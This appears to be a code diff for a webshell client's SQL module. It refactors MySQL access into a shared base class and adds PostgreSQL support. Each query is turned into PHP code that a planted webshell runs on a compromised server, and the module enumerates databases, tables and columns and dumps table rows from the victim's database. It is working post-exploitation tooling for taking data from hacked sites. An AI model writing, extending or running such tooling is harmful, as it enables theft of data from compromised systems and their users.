@@ -1,10 +1,16 @@
-"""MySQL access proxied through the webshell, via ``mysqli``.
+"""SQL access proxied through the webshell.
 
-Rows are returned with ASCII unit/record separators rather than v1's comma
-join, so values that themselves contain commas no longer corrupt the output.
+Supports **MySQL** (via ``mysqli``) and **PostgreSQL** (via ``PDO``). Both
+backends share the same interface and reuse the SQL-standard
+``information_schema`` views (which both engines implement) for metadata.
+
+Rows come back delimited by ASCII unit/record separators rather than v1's comma
+join, so values containing commas no longer corrupt the output.
 """
 
 from __future__ import annotations
+
+from abc import ABC, abstractmethod
 
 from .. import log
 from ..core.php import php_string
@@ -16,52 +22,112 @@ _ROW_SEP = "\x1e"  # ASCII Record Separator
 
 
 def _sql_quote(value: str) -> str:
-    """Return ``value`` as an escaped MySQL string literal."""
-    escaped = value.replace("\\", "\\\\").replace("'", "\\'")
-    return f"'{escaped}'"
+    """Return ``value`` as an escaped SQL string literal."""
+    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"
 
 
-class MysqlManager:
-    def __init__(self, ws: WebShell, host: str, username: str, password: str):
+class SqlClient(ABC):
+    """Common SQL behaviour; subclasses implement the connect/query mechanics."""
+
+    def __init__(
+        self, ws: WebShell, host: str, username: str, password: str, database: str = ""
+    ):
         self.ws = ws
         self.host = host
         self.username = username
         self.password = password
+        self.database = database
 
-    def _connect_prelude(self) -> str:
-        return (
-            "error_reporting(0);"
-            f"$c=new mysqli({php_string(self.host)},{php_string(self.username)},"
-            f"{php_string(self.password)});"
-        )
-
+    @abstractmethod
     def query(self, sql: str) -> list[list[str]]:
-        """Run a SQL statement and return rows as lists of string columns."""
-        code = (
-            self._connect_prelude()
-            + "if($c->connect_errno){echo 'ERR:'.$c->connect_error;}else{"
-            f"$r=$c->query({php_string(sql)});"
-            "if($r===true){echo 'OK';}elseif($r){"
-            f"while($row=$r->fetch_row()){{echo implode('{_COL_SEP}',$row).'{_ROW_SEP}';}}"
-            "}$c->close();}"
-        )
-        result = self.ws.run_php(code)
-        if result.startswith("ERR:"):
-            raise WebshellError(result[4:])
-        rows = [r for r in result.split(_ROW_SEP) if r]
-        return [row.split(_COL_SEP) for row in rows]
+        """Run ``sql`` and return rows as lists of string columns."""
+
+    @abstractmethod
+    def _quote_ident(self, name: str) -> str:
+        """Quote a schema/table identifier for this engine."""
+
+    @abstractmethod
+    def current_namespace(self) -> str:
+        """The default schema/database used when one isn't given."""
+
+    @abstractmethod
+    def databases(self) -> list[str]:
+        """List databases (MySQL) or schemas (PostgreSQL)."""
+
+    @abstractmethod
+    def current_database(self) -> str: ...
+
+    @abstractmethod
+    def current_user(self) -> str: ...
 
     def check_connection(self) -> bool:
         try:
             self.query("SELECT 1")
             return True
         except WebshellError as exc:
-            log.error(f"MySQL connection failed: {exc}")
+            log.error(f"connection failed: {exc}")
             return False
 
     def _scalar(self, sql: str) -> str:
         rows = self.query(sql)
         return rows[0][0] if rows and rows[0] else ""
+
+    def version(self) -> str:
+        return self._scalar("SELECT VERSION()")
+
+    def tables(self, schema: str) -> list[str]:
+        return [
+            r[0]
+            for r in self.query(
+                "SELECT table_name FROM information_schema.tables "
+                f"WHERE table_schema={_sql_quote(schema)}"
+            )
+        ]
+
+    def columns(self, schema: str, table: str) -> list[str]:
+        return [
+            r[0]
+            for r in self.query(
+                "SELECT column_name FROM information_schema.columns "
+                f"WHERE table_schema={_sql_quote(schema)} "
+                f"AND table_name={_sql_quote(table)}"
+            )
+        ]
+
+    def dump(
+        self, schema: str, table: str, limit: int = 50, offset: int = 0
+    ) -> tuple[list[str], list[list[str]]]:
+        """Return ``(columns, rows)`` for a slice of a table."""
+        columns = self.columns(schema, table)
+        ident = f"{self._quote_ident(schema)}.{self._quote_ident(table)}"
+        rows = self.query(f"SELECT * FROM {ident} LIMIT {int(limit)} OFFSET {int(offset)}")
+        return columns, rows
+
+
+class MysqlManager(SqlClient):
+    """MySQL/MariaDB via the ``mysqli`` extension."""
+
+    def query(self, sql: str) -> list[list[str]]:
+        code = (
+            "error_reporting(0);"
+            f"$c=new mysqli({php_string(self.host)},{php_string(self.username)},"
+            f"{php_string(self.password)});"
+            "if($c->connect_errno){echo 'ERR:'.$c->connect_error;}else{"
+            f"$r=$c->query({php_string(sql)});"
+            "if($r===true){echo 'OK';}elseif($r){"
+            f"while($row=$r->fetch_row()){{echo implode('{_COL_SEP}',$row).'{_ROW_SEP}';}}"
+            "}$c->close();}"
+        )
+        return _parse(self.ws.run_php(code))
+
+    def _quote_ident(self, name: str) -> str:
+        return "`" + name.replace("`", "``") + "`"
+
+    def current_namespace(self) -> str:
+        return self.current_database()
+
+    def databases(self) -> list[str]:
+        return [r[0] for r in self.query("SELECT schema_name FROM information_schema.schemata")]
 
     def current_database(self) -> str:
         return self._scalar("SELECT DATABASE()")
@@ -69,27 +135,54 @@ class MysqlManager:
     def current_user(self) -> str:
         return self._scalar("SELECT CURRENT_USER()")
 
-    def version(self) -> str:
-        return self._scalar("SELECT VERSION()")
+
+class PostgresManager(SqlClient):
+    """PostgreSQL via PDO (requires ``pdo_pgsql`` on the target)."""
+
+    def query(self, sql: str) -> list[list[str]]:
+        dsn = "'pgsql:host='." + php_string(self.host)
+        if self.database:
+            dsn += ".';dbname='." + php_string(self.database)
+        code = (
+            "try{"
+            f"$c=new PDO({dsn},{php_string(self.username)},{php_string(self.password)});"
+            f"$s=$c->query({php_string(sql)});"
+            "if($s){foreach($s->fetchAll(PDO::FETCH_NUM) as $row){"
+            f"echo implode('{_COL_SEP}',$row).'{_ROW_SEP}';"
+            # close foreach, if and try (plain string: literal braces, no f-escaping)
+            "}}}catch(Exception $e){echo 'ERR:'.$e->getMessage();}"
+        )
+        return _parse(self.ws.run_php(code))
+
+    def _quote_ident(self, name: str) -> str:
+        return '"' + name.replace('"', '""') + '"'
+
+    def current_namespace(self) -> str:
+        return self._scalar("SELECT current_schema()") or "public"
 
     def databases(self) -> list[str]:
         return [r[0] for r in self.query("SELECT schema_name FROM information_schema.schemata")]
 
-    def tables(self, database: str) -> list[str]:
-        return [
-            r[0]
-            for r in self.query(
-                "SELECT table_name FROM information_schema.tables "
-                f"WHERE table_schema={_sql_quote(database)}"
-            )
-        ]
+    def current_database(self) -> str:
+        return self._scalar("SELECT current_database()")
 
-    def columns(self, database: str, table: str) -> list[str]:
-        return [
-            r[0]
-            for r in self.query(
-                "SELECT column_name FROM information_schema.columns "
-                f"WHERE table_schema={_sql_quote(database)} "
-                f"AND table_name={_sql_quote(table)}"
-            )
-        ]
+    def current_user(self) -> str:
+        return self._scalar("SELECT current_user")
+
+
+ENGINES = {"mysql": MysqlManager, "pgsql": PostgresManager}
+
+
+def make_client(
+    engine: str, ws: WebShell, host: str, username: str, password: str, database: str = ""
+) -> SqlClient:
+    try:
+        return ENGINES[engine](ws, host, username, password, database)
+    except KeyError:
+        raise ValueError(f"unknown DB engine: {engine!r}; choose from {', '.join(ENGINES)}") from None
+
+
+def _parse(result: str) -> list[list[str]]:
+    if result.startswith("ERR:"):
+        raise WebshellError(result[4:])
+    return [row.split(_COL_SEP) for row in result.split(_ROW_SEP) if row]
